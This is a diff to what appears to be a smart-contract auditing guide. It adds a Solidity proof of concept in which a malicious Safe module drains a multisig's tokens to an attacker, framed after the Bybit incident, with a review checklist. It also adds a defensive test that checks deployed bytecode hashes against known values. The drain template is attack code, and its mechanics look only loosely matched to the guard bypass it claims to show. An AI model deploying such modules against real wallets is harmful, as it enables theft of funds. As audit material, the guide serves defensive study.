@@ -779,6 +779,179 @@ contract ERC7702AbusePoc is Test {
 
 ---
 
+## Simulation Guard Bypass PoC
+
+Demonstrates bypassing simulation guards that rely on `tx.origin`, `msg.sender == tx.origin`,
+or `block.number` comparisons to block on-chain execution. Pattern seen in Bybit ($1.5B, 2025).
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+/// @notice Target that uses tx.origin to differentiate simulation from real tx
+interface ISimulationGuardedMultisig {
+    function execTransaction(
+        address to,
+        uint256 value,
+        bytes calldata data,
+        uint8 operation
+    ) external returns (bool);
+}
+
+/// @notice Malicious module injected via Safe module mechanism (simulation-bypasses guard)
+contract MaliciousModule {
+    ISimulationGuardedMultisig public immutable safe;
+    address public immutable attacker;
+
+    constructor(address _safe, address _attacker) {
+        safe = ISimulationGuardedMultisig(_safe);
+        attacker = _attacker;
+    }
+
+    function drain(address token, uint256 amount) external {
+        // Build calldata to transfer tokens out of the Safe
+        bytes memory data = abi.encodeWithSignature(
+            "transfer(address,uint256)",
+            attacker,
+            amount
+        );
+        // Call as module — bypasses normal signature verification
+        safe.execTransaction(token, 0, data, 0 /* CALL */);
+    }
+}
+
+contract SimulationGuardBypassPoC is Test {
+    // Addresses — replace with actual mainnet/fork values
+    address constant SAFE_ADDR = address(0); // TODO: target Safe address
+    address constant TOKEN_ADDR = address(0); // TODO: target token
+    address constant ATTACKER = address(0xdead);
+
+    ISimulationGuardedMultisig safe;
+    MaliciousModule malicious;
+
+    function setUp() public {
+        // Fork mainnet/testnet at block before exploit
+        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
+        safe = ISimulationGuardedMultisig(SAFE_ADDR);
+        malicious = new MaliciousModule(SAFE_ADDR, ATTACKER);
+    }
+
+    function test_SimulationGuardBypass() public {
+        uint256 tokenBalanceBefore = IERC20(TOKEN_ADDR).balanceOf(ATTACKER);
+
+        // Step 1: Module was added via social engineering / compromised UI
+        // In a real attack: attacker tricks signers into approving addModule tx
+        // that appears safe in simulation but executes malicious module approval
+        vm.prank(SAFE_ADDR); // Simulate Safe approving module (proof of concept only)
+        // ISafe(SAFE_ADDR).enableModule(address(malicious)); // uncomment for fork test
+
+        // Step 2: Drain — module executes without needing multisig signatures
+        uint256 drainAmount = IERC20(TOKEN_ADDR).balanceOf(SAFE_ADDR);
+        malicious.drain(TOKEN_ADDR, drainAmount);
+
+        uint256 tokenBalanceAfter = IERC20(TOKEN_ADDR).balanceOf(ATTACKER);
+        assertGt(tokenBalanceAfter, tokenBalanceBefore, "Drain failed");
+
+        console.log("Drained:", tokenBalanceAfter - tokenBalanceBefore);
+    }
+}
+```
+
+**Checklist for simulation guard reviews:**
+- [ ] Does the guard check `tx.origin`? — Bypassable via intermediary contract
+- [ ] Does the guard check `block.number == simulationBlock`? — Predict-and-skip
+- [ ] Are Safe modules audited before approval? — Inspect bytecode, not just ABI
+- [ ] Does the transaction show correct target/data in the signing UI? — Blind signing risk
+- [ ] Is there a Tenderly/simulation integration that can be spoofed by metadata?
+
+---
+
+## Supply Chain Verification PoC
+
+Verifies that deployed bytecode matches expected hash — detects tampered contracts
+introduced via compromised build pipelines or package registries.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "forge-std/Script.sol";
+
+/// @notice Utility for on-chain bytecode integrity verification
+library BytecodeVerifier {
+    /// @notice Returns keccak256 of the deployed bytecode at `target`
+    function codeHash(address target) internal view returns (bytes32) {
+        return target.codehash;
+    }
+
+    /// @notice Asserts deployed bytecode matches the expected hash
+    function assertCodeHash(address target, bytes32 expected, string memory label) internal view {
+        bytes32 actual = target.codehash;
+        require(
+            actual == expected,
+            string(abi.encodePacked(label, ": bytecode hash mismatch"))
+        );
+    }
+}
+
+/// @notice Run before any deployment to confirm dependency contracts are unmodified
+contract SupplyChainVerificationTest is Test {
+    using BytecodeVerifier for address;
+
+    // Expected bytecode hashes — pre-computed from audited source + compiler settings
+    // Generate with: cast code <address> --rpc-url $RPC | keccak256
+    bytes32 constant EXPECTED_SAFE_IMPL_HASH    = bytes32(0); // TODO: fill from audit
+    bytes32 constant EXPECTED_OZ_ERC20_HASH     = bytes32(0); // TODO: fill from audit
+    bytes32 constant EXPECTED_PROXY_HASH        = bytes32(0); // TODO: fill from audit
+
+    address constant SAFE_IMPL_ADDR   = address(0); // TODO: fill
+    address constant OZ_ERC20_ADDR    = address(0); // TODO: fill
+    address constant PROXY_ADDR       = address(0); // TODO: fill
+
+    function setUp() public {
+        // vm.createSelectFork(vm.envString("ETH_RPC_URL"));
+    }
+
+    /// @notice Verify all critical dependency contracts before interacting
+    function test_VerifyDependencyBytecodes() public view {
+        // Safe: verify implementation hasn't been swapped
+        SAFE_IMPL_ADDR.assertCodeHash(EXPECTED_SAFE_IMPL_HASH, "SafeImpl");
+
+        // OpenZeppelin: verify library contract matches known-good hash
+        OZ_ERC20_ADDR.assertCodeHash(EXPECTED_OZ_ERC20_HASH, "OZToken");
+
+        // Proxy: verify proxy points to expected implementation
+        address impl = _readImplementationSlot(PROXY_ADDR);
+        assertEq(impl.codehash, EXPECTED_PROXY_HASH, "Proxy impl changed");
+    }
+
+    /// @notice Log all bytecode hashes for first-time capture
+    function test_CaptureHashes() public view {
+        console.logBytes32(SAFE_IMPL_ADDR.codeHash());
+        console.logBytes32(OZ_ERC20_ADDR.codeHash());
+        console.logBytes32(PROXY_ADDR.codeHash());
+    }
+
+    /// @notice Read ERC-1967 implementation slot
+    function _readImplementationSlot(address proxy) internal view returns (address) {
+        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        bytes32 value = vm.load(proxy, slot);
+        return address(uint160(uint256(value)));
+    }
+}
+```
+
+**How to use this template:**
+1. Before deploying, run `cast code <address> | sha3` to capture expected hashes
+2. Store hashes in the test file or a separate `hashes.json` (committed to repo)
+3. Run verification test on every deployment + upgrade to catch tampered bytecode
+4. Integrate as a CI step: `forge test --match-contract SupplyChainVerification --fork-url $RPC`
+
+---
+
 ## Test Execution
 
 ```bash
